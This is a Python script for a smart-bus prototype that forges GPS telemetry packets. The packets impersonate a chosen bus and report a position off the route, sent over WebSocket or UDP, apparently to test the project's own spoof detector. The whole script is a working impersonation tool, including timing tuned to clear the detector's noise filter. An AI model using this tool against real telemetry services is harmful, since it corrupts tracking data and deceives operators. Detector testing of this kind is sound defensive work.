#!/usr/bin/env python3
"""Al-Ahsa Smart Bus — GPS spoofing attack.

Sends forged GPS telemetry packets that impersonate a given ``bus_id``
but report a fake position far from the real route. Two transports
are supported:

* **WebSocket (default for the internet build).** Pass ``--server-url``
  with the public base URL (e.g. ``https://jetson.testingdomainz...``).
  Frames go to ``/ingest/gps`` over WSS; the server-side GPS detector
  picks them up and (after 3 consecutive anomalies) writes a
  ``gps_spoof`` event into the dashboard.
* **UDP (legacy LAN build).** Pass ``--target <host>`` instead. Packets
  go to UDP port 5000 of a Jetson running the old local detector.

Wire format (little-endian, 200 bytes total) is identical in both modes:
    [0..3]   uint32  magic   = 0x47505331 ("GPS1")
    [4..7]   uint32  bus_id
    [8..15]  double  pos_x
    [16..23] double  pos_y
    [24..199] zeros

Default fake position: (14000, 1000) — ~6.5 km off route 0's corridor,
which alone is enough to trigger the corridor anomaly on every packet.

The server-side detector is one-shot per ``bus_id``. To re-test after a
trigger, spoof a different bus_id or restart the server.

Examples:
    # Internet build (server-side detector):
    python gps_spoof.py --server-url https://jetson.testingdomainzforprototypes.website --bus-id 1

    # LAN build (legacy local detector on a Jetson):
    python gps_spoof.py --target 192.168.3.199 --bus-id 0
"""

from __future__ import annotations

import argparse
import logging
import signal
import socket
import struct
import sys
import time

logger = logging.getLogger(__name__)

GPS_PAYLOAD_MAGIC = 0x47505331
PACKET_SIZE = 200
DEFAULT_INTERVAL = 0.6        # > 0.5 s noise floor on the detector
DEFAULT_PORT = 5000
DEFAULT_COUNT = 8             # 8 * 0.6 s ≈ 5 s, enough for a 3-streak
_HEADER_FMT = "<IIdd"
_HEADER_SIZE = struct.calcsize(_HEADER_FMT)


def build_gps_packet(bus_id: int, pos_x: float, pos_y: float) -> bytes:
    header = struct.pack(_HEADER_FMT, GPS_PAYLOAD_MAGIC, bus_id, pos_x, pos_y)
    return header + b"\x00" * (PACKET_SIZE - _HEADER_SIZE)


# ---------------------------------------------------------------------------
# Sender — UDP legacy
# ---------------------------------------------------------------------------

def run_spoof_udp(
    target: str, port: int, bus_id: int,
    fake_x: float, fake_y: float, count: int, interval: float,
    stop_flag: list,
) -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    logger.info(
        "GPS spoof (UDP) -> %s:%d  bus_id=%d  fake=(%g, %g)  count=%d",
        target, port, bus_id, fake_x, fake_y, count,
    )
    sent = 0
    try:
        for seq in range(count):
            if stop_flag[0]:
                break
            packet = build_gps_packet(bus_id, fake_x, fake_y)
            try:
                sock.sendto(packet, (target, port))
                sent += 1
                print(f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
                      f"pos=({fake_x:g}, {fake_y:g})  -> udp://{target}:{port}")
            except OSError as exc:
                logger.warning("send error on pkt %d: %s", seq + 1, exc)
            if seq < count - 1 and not stop_flag[0]:
                _sleep(interval, stop_flag)
    finally:
        sock.close()
    return sent


# ---------------------------------------------------------------------------
# Sender — WebSocket (internet build)
# ---------------------------------------------------------------------------

def _to_ws_url(server_url: str) -> str:
    base = server_url.rstrip("/")
    if base.startswith("https://"):
        base = "wss://" + base[len("https://"):]
    elif base.startswith("http://"):
        base = "ws://" + base[len("http://"):]
    return base + "/ingest/gps"


def run_spoof_ws(
    server_url: str, bus_id: int, fake_x: float, fake_y: float,
    count: int, interval: float, stop_flag: list,
) -> int:
    try:
        import websocket  # from `pip install websocket-client`
    except ImportError:
        sys.stderr.write("ERROR: missing dependency. Run: pip install websocket-client\n")
        sys.exit(1)

    url = _to_ws_url(server_url)
    logger.info(
        "GPS spoof (WSS) -> %s  bus_id=%d  fake=(%g, %g)  count=%d  interval=%.2fs",
        url, bus_id, fake_x, fake_y, count, interval,
    )
    try:
        ws = websocket.create_connection(url, timeout=10)
    except Exception as exc:
        sys.stderr.write(f"ERROR: could not connect to {url}: {exc}\n")
        sys.exit(2)

    sent = 0
    try:
        for seq in range(count):
            if stop_flag[0]:
                break
            packet = build_gps_packet(bus_id, fake_x, fake_y)
            try:
                ws.send_binary(packet)
                sent += 1
                print(f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
                      f"pos=({fake_x:g}, {fake_y:g})  -> {url}")
            except Exception as exc:
                logger.warning("WS send error on pkt %d: %s", seq + 1, exc)
                break
            if seq < count - 1 and not stop_flag[0]:
                _sleep(interval, stop_flag)
    finally:
        try:
            ws.close()
        except Exception:
            pass
    return sent


def _sleep(duration: float, stop_flag: list) -> None:
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline and not stop_flag[0]:
        time.sleep(min(0.05, deadline - time.monotonic()))


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    p = argparse.ArgumentParser(
        description="Al-Ahsa Smart Bus — GPS spoofing attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    transport = p.add_mutually_exclusive_group(required=True)
    transport.add_argument(
        "--server-url",
        help="Public server base URL (e.g. https://jetson.example.com). "
             "Sends WSS frames to /ingest/gps. Use this for the internet build."
    )
    transport.add_argument(
        "--target",
        help="Target IP for legacy UDP mode (LAN build only).",
    )
    p.add_argument("--bus-id", type=int, default=1,
                   help="Bus ID to impersonate (default 1; avoid the bus_id "
                        "your Jetson is actually sending so the streak builds).")
    p.add_argument("--fake-x", type=float, default=14000.0,
                   help="Fake X coordinate in meters (default 14000)")
    p.add_argument("--fake-y", type=float, default=1000.0,
                   help="Fake Y coordinate in meters (default 1000)")
    p.add_argument("--count", type=int, default=DEFAULT_COUNT,
                   help=f"Number of spoofed packets (default {DEFAULT_COUNT})")
    p.add_argument("--interval", type=float, default=DEFAULT_INTERVAL,
                   help=f"Seconds between packets (default {DEFAULT_INTERVAL}; "
                        "must be >= 0.5 to clear the detector's noise filter)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT,
                   help="UDP port (legacy mode only; default 5000)")
    p.add_argument("--verbose", "-v", action="store_true")
    args = p.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    if args.interval < 0.5:
        logger.warning("--interval %.2f is below the detector's 0.5 s noise floor; "
                       "the server will silently drop these packets.", args.interval)

    stop_flag = [False]

    def _signal_handler(signum, frame):
        stop_flag[0] = True
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    if args.server_url:
        sent = run_spoof_ws(
            args.server_url, args.bus_id, args.fake_x, args.fake_y,
            args.count, args.interval, stop_flag,
        )
        target_str = args.server_url
    else:
        sent = run_spoof_udp(
            args.target, args.port, args.bus_id, args.fake_x, args.fake_y,
            args.count, args.interval, stop_flag,
        )
        target_str = f"{args.target}:{args.port}"

    print(f"\nGPS spoof finished. Sent {sent}/{args.count} packets "
          f"for bus_id={args.bus_id} to {target_str}")


if __name__ == "__main__":
    main()
